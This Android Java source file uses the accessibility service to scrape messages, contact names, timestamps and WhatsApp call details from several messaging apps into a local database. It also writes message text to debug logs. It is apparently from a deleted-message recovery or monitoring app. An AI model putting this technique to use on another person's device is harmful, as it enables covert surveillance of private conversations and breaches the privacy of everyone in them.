package com.im.bin.appUtils;

import android.content.Context;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityNodeInfo;

import com.im.bin.accessibility.AccessibilityUtil;
import com.im.bin.db.entities.Hike;
import com.im.bin.db.entities.IMO;
import com.im.bin.db.entities.Instagram;
import com.im.bin.db.entities.Line;
import com.im.bin.db.entities.SnapChat;
import com.im.bin.db.entities.Viber;
import com.im.bin.db.entities.WhatsApp;
import com.im.bin.enums.IMType;
import com.im.bin.interfaces.IMBinChat;

import java.util.ArrayList;

import timber.log.Timber;

import static com.im.bin.accessibility.AccessibilityUtil.formatDateString;
import static com.im.bin.accessibility.AccessibilityUtil.imContactName;
import static com.im.bin.accessibility.AccessibilityUtil.imContactStatus;
import static com.im.bin.accessibility.AccessibilityUtil.imDate;
import static com.im.bin.accessibility.AccessibilityUtil.imMessageText;
import static com.im.bin.accessibility.AccessibilityUtil.isIncomingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.isOutgoingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.lastDateString;
import static com.im.bin.accessibility.AccessibilityUtil.lastIMPackage;
import static com.im.bin.accessibility.AccessibilityUtil.lastIMTypedText;
import static com.im.bin.accessibility.AccessibilityUtil.lastTypedText;
import static com.im.bin.accessibility.AccessibilityUtil.messageType;
import static com.im.bin.accessibility.AccessibilityUtil.senderName;
import static com.im.bin.accessibility.AccessibilityUtil.tumblrConversations;
import static com.im.bin.accessibility.AccessibilityUtil.viberConversations;
import static com.im.bin.accessibility.AccessibilityUtil.voipDirection;
import static com.im.bin.accessibility.AccessibilityUtil.voipMessener;
import static com.im.bin.accessibility.AccessibilityUtil.voipName;
import static com.im.bin.accessibility.AccessibilityUtil.voipNumber;
import static com.im.bin.accessibility.AccessibilityUtil.voipStartTime;


public class IMMessagesBinUtil implements IMBinChat {

    @Override
    public void traverseChat(Context context, String pkgName, AccessibilityNodeInfo accessibilityNodeInfo, boolean isFirstIteration) {
        printAllIMMessagesInfo(context, pkgName, accessibilityNodeInfo, isFirstIteration, false, accessibilityNodeInfo.getChildCount(), 0);
    }

    private void printAllIMMessagesInfo(Context context, String pkgName, AccessibilityNodeInfo source,
                                        boolean firstIteration, boolean lastIteration, int totalChilds, int currentChild) {
        try {
            if (firstIteration) {
                if (!lastIMPackage.equals(pkgName)) {
                    lastDateString = formatDateString("TODAY");
                    imMessageText = "";
                    imDate = "";
                    imContactName = "";
                    imContactStatus = "";
                    senderName = "";
                    messageType = "";
                    lastIMPackage = pkgName;
                    viberConversations = new ArrayList<>();
                    tumblrConversations = new ArrayList<>();
                    Timber.d("Test, first iteration");
                } else if (pkgName.equals("jp.naver.line.android") || pkgName.equals("com.instagram.android")) {
                    imDate = "";
                    imMessageText = "";
                } else if (pkgName.equals("com.snapchat.android")) {
                    imDate = "";
                    imMessageText = "";
                    senderName = "";
                }
            }
            String id = source.getViewIdResourceName();
            if (id != null) {
                id = id.split("/")[1];
            }
            String className = source.getClassName().toString();
            String text = "";
            if (source.getText() != null)
                text = source.getText().toString();
            if (("android.widget.TextView").equals(className) || ("android.widget.EditText")
                    .equals(className)) {
                retrieveMessages(context, pkgName, text, id, className);
            } else if (pkgName.equals("com.snapchat.android") && className.equals("javaClass")) {
                retrieveMessages(context, pkgName, text, id, className);
            }

//            if (pkgName.equals("com.whatsapp")) {
//                if ("android.widget.ImageView".equals(className)) {
//                    if (id != null && (id.equals("image") || id.equals("forward"))) {
//                        isImageCaptured = true;
//                    }
//                }
//            }
//
//            if (lastIteration && isImageCaptured) {
//                Intent intent = new Intent(context, PhotosIntentService.class);
//                intent.putExtra(PhotosIntentService.SEND_RESULT_BACK, false);
//                context.startService(intent);
//                isImageCaptured = false;
//            }

            int sourceChilds = source.getChildCount();
            if (totalChilds == currentChild) {
                if (sourceChilds == 0) {
                    return;
                }
            }

            for (int i = 0; i < source.getChildCount(); i++) {
                AccessibilityNodeInfo child = source.getChild(i);
                if (child != null) {
                    lastIteration = i == sourceChilds - 1;
                    printAllIMMessagesInfo(context, pkgName, child, false, lastIteration, sourceChilds, i + 1);
                    child.recycle();
                } else {
                    return;
                }
            }
        } catch (Exception e) {
            Timber.d("Error Getting IM Logs: " + e.getMessage());
        }
    }

    private void retrieveMessages(Context context, String pkgName, String sourceText, String id, String className) {
        switch (pkgName) {
            case "com.whatsapp":
            case "com.whatsapp.w4b":
                printAllWhatsAppMessages(context, sourceText, id);
                break;
            case "jp.naver.line.android":
                printLineMessages(context, sourceText, id);
                break;
            case "com.viber.voip":
                printViberMessages(context, sourceText, id);
                break;
            case "com.imo.android.imoim":
                printIMOMessages(context, sourceText, id);
                break;
            case "com.instagram.android":
                printInstagramMessages(context, sourceText, id);
                break;
            case "com.snapchat.android":
                printSnapChatMessages(context, sourceText, id, className);
                break;
            case "com.hike.chat.stickers":
            case "com.bsb.hike":
                printHikeMessages(context, sourceText, id);
                break;
            case "com.google.android.talk":
                printGoogleHangouts(context, sourceText, id);
                break;
        }
        Timber.d("WDS, id = " + id + ", text = " + sourceText + ", className = " + className);
    }

    private void printGoogleHangouts(Context context, String sourceText, String id) {
        if (id != null && id.equals("title")) {
            AccessibilityUtil.hangOutConversationName = sourceText;
        }
    }

    private void printAllWhatsAppMessages(Context context, String sourceText, String id) {
        try {
            Timber.d("Test, id = " + id + ",  text = " + sourceText);
            boolean isModeEnabled = AccessibilityUtil.isVOIPModeActive(context);
            if (!isIncomingVoipCaptured && !isOutgoingVoipCaptured) {
                if (id != null && id.equals("call_status")) {
                    sourceText = sourceText.toLowerCase();
                    if (sourceText.equals("calling") || sourceText.equals("ringing")) {
                        voipDirection = "outgoing";
                    }
                } else if (id != null && id.equals("name")) {
                    voipName = sourceText;
                    voipNumber = "";
                } else if (!TextUtils.isEmpty(voipName) && (sourceText.startsWith("0:") || isModeEnabled)) {
                    voipStartTime = System.currentTimeMillis();
                    voipDirection = TextUtils.isEmpty(voipDirection) ? "incoming" : "outgoing";
                    voipMessener = IMType.WhatsApp.toString();
                    if (voipDirection.equals("incoming")) {
                        isIncomingVoipCaptured = true;
                    } else {
                        isOutgoingVoipCaptured = true;
                    }
                }
            }

            if (id != null) {
                if (id.equals("message_text") && !sourceText.contains("You deleted this message") && !sourceText.contains("This message was deleted")) {
                    imMessageText = sourceText;
                    Timber.d("text details = %s", imMessageText);
                } else if (id.equals("date")) {
                    if (!TextUtils.isEmpty(imMessageText) && !TextUtils.isEmpty(imContactName)) {
                        imDate = sourceText;
                        boolean isOutgoing = imMessageText.equals(lastTypedText);
                        if (TextUtils.isEmpty(senderName) || isOutgoing) {
                            messageType = isOutgoing ? "outgoing" : "incoming";
                        } else {
                            messageType = "incoming";
                        }

                        if (messageType.equals("outgoing"))
                            senderName = "";
                        String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                        imDate = lastDateString + imDate;
                        Timber.d("Test, message = " + imDate + " " + imMessageText);
                        if (InjectorUtils.provideWhatsAppRepository(context).checkMessageNotExitsAlready(messageId)) {
//                            if (imContactName.equals("S9 Samsung")) {
//                                imContactName = "Alex Stewart";
//                            } else if (imContactName.equals("Umair Munir Ahmed")) {
//                                imContactName = "Emily Smith";
//                                imMessageText = "Hey Emily, Whats Up ?";
//                            } else if (imContactName.equals("Usama Jamil")) {
//                                imContactName = "Olivia John";
//                                imMessageText = "Did you received my message ?";
//                            } else if (imContactName.equals("Sir Arshid")) {
//                                imContactName = "John Campbell";
//                                imMessageText = "Have you found deleted messages ?";
//                            } else if (imContactName.equals("Amir Ufone")) {
//                                imContactName = "Smith Johnson";
//                                imMessageText = "I haven't deleted your messages, brother ";
//                            } else if (imContactName.equals("Office Testing")) {
//                                imContactName = "Katty Perry";
//                                imMessageText = "Looking for your whatsApp Messages ";
//                            } else if (imContactName.equals("Nexus")) {
//                                imContactName = "Angela Smith";
//                                imMessageText = "Angela, Please Check your Snapchat messages";
//                            } else if (imContactName.equals("Oxigen Noor")) {
//                                imContactName = "Alba Jordan";
//                                imMessageText = "Alba, saw my messages ?";
//                            }

                            WhatsApp whatsApp = new WhatsApp.WhatsAppBuilder()
                                    .setMessageId(messageId)
                                    .setConversationId(imContactName)
                                    .setConversationName(imContactName)
                                    .setSenderName(senderName)
                                    .setMessage(imMessageText)
                                    .setType(messageType)
                                    .setMessageDatetime(imDate)
                                    .setTimeStamp(System.currentTimeMillis())
                                    .setDate(Util.getDate(System.currentTimeMillis()))
                                    .setIsDeleted("0")
                                    .setStatus(0)
                                    .create();
                            InjectorUtils.provideWhatsAppRepository(context).insertWhatsApp(whatsApp);
                            Timber.d("whatsApp, store message = " + imDate + " " + imMessageText + " " + imContactName);
                        }

                        imMessageText = "";
                        imDate = "";
                    }
                } else if (id.equals("conversation_contact_name")) {
                    imContactName = sourceText;
                } else if (id.equals("conversation_contact_status")) {
                    imContactStatus = sourceText;
                } else if (id.equals("name_in_group_tv")) {
                    senderName = sourceText;
                }
            }
        } catch (Exception e) {
            Timber.d(e);
        }
    }

    private void printLineMessages(Context context, String sourceText, String id) {
        try {
            if (id.equals("header_title")) {
                imContactName = sourceText;
            } else if (id.equals("chathistory_row_sender")) {
                senderName = sourceText;
            } else if (id.equals("chathistory_row_timestamp")) {
                imDate = sourceText;
                if (!TextUtils.isEmpty(imContactName) && !TextUtils.isEmpty(imMessageText)) {
                    imDate = lastDateString + imDate;
                    messageType = lastTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideLineRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Line line = new Line.LineUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideLineRepository(context).insertLine(line);
                        Timber.d("Line, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imDate = "";
                    imMessageText = "";
                    senderName = "";
                }
            } else if (id.equals("message_text")) {
                imMessageText = sourceText;
                if (!TextUtils.isEmpty(imDate) && !TextUtils.isEmpty(imContactName)) {
                    imDate = lastDateString + imDate;
                    messageType = lastTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideLineRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Line line = new Line.LineUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideLineRepository(context).insertLine(line);
                        Timber.d("Line, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imDate = "";
                    imMessageText = "";
                    senderName = "";
                }
            }
            Timber.d("Test, id = " + id + ", text = " + sourceText);
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }

    private void printViberMessages(Context context, String sourceText, String id) {
        try {
            if (id == null && viberConversations.contains(sourceText)) {
                imContactName = sourceText;
            } else if (id.equals("from") && !viberConversations.contains(sourceText)) {
                viberConversations.add(sourceText);
            } else if (id.equals("textMessageView")) {
                imMessageText = sourceText;
            } else if (id.equals("nameView")) {
                senderName = sourceText;
            } else if (id.equals("timestampView")) {
                imDate = sourceText;
                imDate = lastDateString + imDate;
                messageType = lastIMTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                if (!TextUtils.isEmpty(imContactName) && !TextUtils.isEmpty(imMessageText)) {
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideViberRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Viber viber = new Viber.ViberBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideViberRepository(context).insertViber(viber);
                        Timber.d("Viber, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imMessageText = "";
                    imDate = "";
                    senderName = "";
                }
            }
            Timber.d("Test, id = " + id + ", text = " + sourceText);
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }

    private void printHikeMessages(Context context, String sourceText, String id) {
        try {
            if (id.equals("contact_name")) {
                imContactName = sourceText;
            } else if (id.equals("text")) {
                imMessageText = sourceText;
            } else if (id.equals("time")) {
                imDate = sourceText;
                imDate = lastDateString + sourceText;
                if (!TextUtils.isEmpty(imContactName) && !TextUtils.isEmpty(imMessageText)) {
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideHikeRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Hike hike = new Hike.HikeUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideHikeRepository(context).insertHike(hike);
                        messageType = lastIMTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                        Timber.d("Hike, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imMessageText = "";
                    imDate = "";
                    senderName = "";
                }
            } else if (id.equals("sender_name")) {
                senderName = sourceText;
            }
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }

    private void printSnapChatMessages(Context context, String sourceText, String id, String className) {
        try {
            if (id == null && className.equals("javaClass")) {
                if (sourceText.contains(":") && TextUtils.isEmpty(imDate)) {
                    imDate = sourceText;
                } else {
                    imMessageText = sourceText;
                    if (!TextUtils.isEmpty(imDate) && !TextUtils.isEmpty(imContactName)) {
                        imDate = lastDateString + imDate;
                        messageType = lastTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                        String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                        if (InjectorUtils.provideSnapChatRepository(context).checkMessageNotExitsAlready(messageId)) {
                            SnapChat snapChat = new SnapChat.SnapChatUnrootedBuilder()
                                    .setMessageId(messageId)
                                    .setConversationId(imContactName)
                                    .setConversationName(imContactName)
                                    .setSenderName(senderName)
                                    .setMessage(imMessageText)
                                    .setType(messageType)
                                    .setMessageDatetime(imDate)
                                    .setTimeStamp(System.currentTimeMillis())
                                    .setDate(Util.getDate(System.currentTimeMillis()))
                                    .setIsDeleted("0")
                                    .setStatus(0)
                                    .create();
                            InjectorUtils.provideSnapChatRepository(context).insertSnapChat(snapChat);
                            Timber.d("Snapchat, messageId = " + messageId
                                    + ", contactName = " + imContactName
                                    + ", senderName = " + senderName
                                    + ", message Text = " + imMessageText
                                    + ", message Type = " + messageType
                                    + ", timeStamp = " + imDate);
                        }
                        imDate = "";
                        imMessageText = "";
                    }
                }
            } else if (id != null) {
                if (id.equals("conversation_title_text_view")) {
                    imContactName = sourceText;
                } else if (id.equals("chat_message_time")) {
                    imDate = sourceText;
                } else if (id.equals("text") || id.equals("media_card_title")) {
                    imMessageText = sourceText;
                    if (!TextUtils.isEmpty(imDate) && !TextUtils.isEmpty(imContactName)) {
                        imDate = lastDateString + imDate;
                        messageType = senderName.equals("ME") ? "outgoing" : "incoming";
                        String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                        if (InjectorUtils.provideSnapChatRepository(context).checkMessageNotExitsAlready(messageId)) {
                            SnapChat snapChat = new SnapChat.SnapChatUnrootedBuilder()
                                    .setMessageId(messageId)
                                    .setConversationId(imContactName)
                                    .setConversationName(imContactName)
                                    .setSenderName(senderName)
                                    .setMessage(imMessageText)
                                    .setType(messageType)
                                    .setMessageDatetime(imDate)
                                    .setTimeStamp(System.currentTimeMillis())
                                    .setDate(Util.getDate(System.currentTimeMillis()))
                                    .setIsDeleted("0")
                                    .setStatus(0)
                                    .create();
                            InjectorUtils.provideSnapChatRepository(context).insertSnapChat(snapChat);
                            Timber.d("Snapchat, messageId = " + messageId
                                    + ", contactName = " + imContactName
                                    + ", senderName = " + senderName
                                    + ", message Text = " + imMessageText
                                    + ", message Type = " + messageType
                                    + ", timeStamp = " + imDate);
                        }
                        imDate = "";
                        imMessageText = "";
                    }
                } else if (id.equals("sender")) {
                    senderName = sourceText;
                }
            }
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }

    private void printInstagramMessages(Context context, String sourceText, String id) {
        try {
            if (id.equals("thread_title")) {
                imContactName = sourceText;
            } else if (id.equals("direct_text_message_text_view")) {
                imMessageText = sourceText;
                if (!TextUtils.isEmpty(imDate) && !TextUtils.isEmpty(imContactName)) {
                    messageType = lastTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideInstagramRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Instagram instagram = new Instagram.InstagramUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideInstagramRepository(context).insertInstagram(instagram);
                        Timber.d("Instagram, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imDate = "";
                    imMessageText = "";
                    senderName = "";
                }
            } else if (id.equals("message_status") && !sourceText.equals("Sending...")) {
                imDate = lastDateString + sourceText;
                if (!TextUtils.isEmpty(imContactName) && !TextUtils.isEmpty(imMessageText)) {
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    if (InjectorUtils.provideInstagramRepository(context).checkMessageNotExitsAlready(messageId)) {
                        Instagram instagram = new Instagram.InstagramUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideInstagramRepository(context).insertInstagram(instagram);
                        Timber.d("Instagram, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imMessageText = "";
                    imDate = "";
                    senderName = "";
                }
            }
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }

    private void printIMOMessages(Context context, String sourceText, String id) {
        try {
            if (id.equals("chat_name")) {
                imContactName = sourceText;
            } else if (id.equals("tv_message")) {
                imMessageText = sourceText;
            } else if (id.equals("imkit_date_inside")) {
                imDate = sourceText;
                if (!imDate.contains(","))
                    imDate = lastDateString + imDate;
                if (!TextUtils.isEmpty(imContactName) && !TextUtils.isEmpty(imMessageText)) {
                    String messageId = Util.md5Hash(imContactName + imMessageText + imDate);
                    messageType = lastIMTypedText.equals(imMessageText) ? "outgoing" : "incoming";
                    if (InjectorUtils.provideIMORepository(context).checkMessageNotExitsAlready(messageId)) {
                        IMO imo = new IMO.IMOUnrootedBuilder()
                                .setMessageId(messageId)
                                .setConversationId(imContactName)
                                .setConversationName(imContactName)
                                .setSenderName(senderName)
                                .setMessage(imMessageText)
                                .setType(messageType)
                                .setMessageDatetime(imDate)
                                .setTimeStamp(System.currentTimeMillis())
                                .setDate(Util.getDate(System.currentTimeMillis()))
                                .setIsDeleted("0")
                                .setStatus(0)
                                .create();
                        InjectorUtils.provideIMORepository(context).insertIMO(imo);
                        Timber.d("Imo, messageId = " + messageId
                                + ", contactName = " + imContactName
                                + ", senderName = " + senderName
                                + ", message Text = " + imMessageText
                                + ", message Type = " + messageType
                                + ", timeStamp = " + imDate);
                    }
                    imMessageText = "";
                    imDate = "";
                    senderName = "";
                }
            } else if (id.equals("message_buddy_name")) {
                senderName = sourceText;
            }
        } catch (Exception e) {
            Timber.d(e.getMessage());
        }
    }


//    private void printTumblrMessages(Context context, String sourceText, String id) {
//        try {
//            if (id == null && tumblrConversations.contains(sourceText)) {
//                imContactName = sourceText;
//            } else if (id != null && id.equals("blog_name")) {
//                senderName = sourceText;
//            } else if (id != null && id.equals("message")) {
//                imMessageText = sourceText;
//                imDate = Util.formatDate(String.valueOf(System.currentTimeMillis()));
//                if (!TextUtils.isEmpty(imMessageText)) {
//                    String messageId = Util.md5Hash(imContactName + imMessageText);
//                    TumblrUnrootedRepository tumblrUnrootedRepository = new TumblrUnrootedRepository(context);
//                    if (tumblrUnrootedRepository.checkIfNotExistsAlready(messageId)) {
//                        String conversationId = imContactName;
//                        messageType = lastIMTypedText.equals(imMessageText) ? "outgoing" : "incoming";
//                        Timber.d("Tumblr, messageId = " + messageId
//                                + ", conversationId = " + conversationId
//                                + ", contactName = " + imContactName
//                                + ", senderName = " + senderName
//                                + ", message Text = " + imMessageText
//                                + ", message Type = " + messageType
//                                + ", timeStamp = " + imDate);
//
//                        TumblrUnrooted tumblrUnrooted = new TumblrUnrooted.TumblrUnrootedBuilder()
//                                .setUniqueId(messageId)
//                                .setConversationId(conversationId)
//                                .setConversationName(imContactName)
//                                .setSenderName(senderName)
//                                .setMessage(Util.convertStringToBase64(imMessageText))
//                                .setType(messageType)
//                                .setMessageDatetime(imDate)
//                                .setStatus(0)
//                                .create();
//                        tumblrUnrootedRepository.insertTumblrUnrooted(tumblrUnrooted);
//                    }
//                    imMessageText = "";
//                    imDate = "";
//                    senderName = "";
//                }
//            } else if (id != null && id.equals("participants") && !tumblrConversations.contains(sourceText)) {
//                tumblrConversations.add(sourceText);
//            }
//        } catch (Exception e) {
//            Timber.d(e.getMessage());
//        }
//    }

//    private void printTinderMessages(Context context, String sourceText, String id) {
//        try {
//            if (id.equals("chat_toolbar_user_name")) {
//                imContactName = sourceText;
//            } else if (id.equals("chatTextMessageContent")) {
//                imMessageText = sourceText;
//                imDate = Util.formatDate(String.valueOf(System.currentTimeMillis()));
//                if (!TextUtils.isEmpty(imMessageText)) {
//                    String messageId = Util.md5Hash(imContactName + imMessageText);
//                    TinderUnrootedRepository tinderUnrootedRepository = new TinderUnrootedRepository(context);
//                    if (tinderUnrootedRepository.checkIfNotExistsAlready(messageId)) {
//                        String conversationId = imContactName;
//                        messageType = lastIMTypedText.equals(imMessageText) ? "outgoing" : "incoming";
//                        Timber.d("Tinder, messageId = " + messageId
//                                + ", conversationId = " + conversationId
//                                + ", contactName = " + imContactName
//                                + ", senderName = " + senderName
//                                + ", message Text = " + imMessageText
//                                + ", message Type = " + messageType
//                                + ", timeStamp = " + imDate);
//
//                        TinderUnrooted tinderUnrooted = new TinderUnrooted.TinderUnrootedBuilder()
//                                .setUniqueId(messageId)
//                                .setConversationId(conversationId)
//                                .setConversationName(imContactName)
//                                .setSenderName(senderName)
//                                .setMessage(Util.convertStringToBase64(imMessageText))
//                                .setType(messageType)
//                                .setMessageDatetime(imDate)
//                                .setStatus(0)
//                                .create();
//                        tinderUnrootedRepository.insertTinderUnrooted(tinderUnrooted);
//                    }
//                    imMessageText = "";
//                    imDate = "";
//                    senderName = "";
//                }
//            }
//        } catch (Exception e) {
//            Timber.d(e.getMessage());
//        }
//    }
}
